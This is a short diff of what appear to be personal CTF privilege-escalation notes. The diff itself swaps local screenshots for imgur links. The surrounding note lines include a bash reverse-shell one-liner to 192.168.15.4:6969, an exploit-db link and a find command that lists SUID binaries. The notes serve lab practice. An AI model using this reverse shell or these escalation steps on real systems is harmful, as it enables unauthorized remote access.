@@ -41,18 +41,18 @@ https://medium.com/techiepedia/series-of-ctf-machines-walkthrough-4-linux-privil
 `ls -R * 2>dev/null| grep -i flag`
 `cat /usr/local/bin/flag_process.sh`
 ![](https://i.imgur.com/0KhHbmc.png)
-![[bilder/Pasted image 20250117211103.png]]
-![[bilder/Pasted image 20250117211250.png]]
-![[bilder/Pasted image 20250117211407.png]]
-![[bilder/Pasted image 20250117211426.png]]
+![](https://i.imgur.com/UGcn08t.png)
+![](https://i.imgur.com/MFNTBGs.png)
+![](https://i.imgur.com/Z885wJP.png)
+![](https://i.imgur.com/ziYwvHF.png)
 https://www.exploit-db.com/exploits/42274
 
 
 https://www.puckiestyle.nl/upgrading-netcat-shells-to-meterpreter-sessions/
 `bash -i> /dev/tcp/192.168.15.4/6969 0>&1`
-![[bilder/Pasted image 20250117234351.png]]
-![[bilder/Pasted image 20250117234356.png]]
-![[bilder/Pasted image 20250117234535.png]]
+![](https://i.imgur.com/ne9aUCq.png)
+![](https://i.imgur.com/XJU4hYR.png)
+![](https://i.imgur.com/WUgbYOs.png)
 suid thing
 ```bash
 find / -type f -perm -4001 -exec ls -h {} \; 2> /dev/null
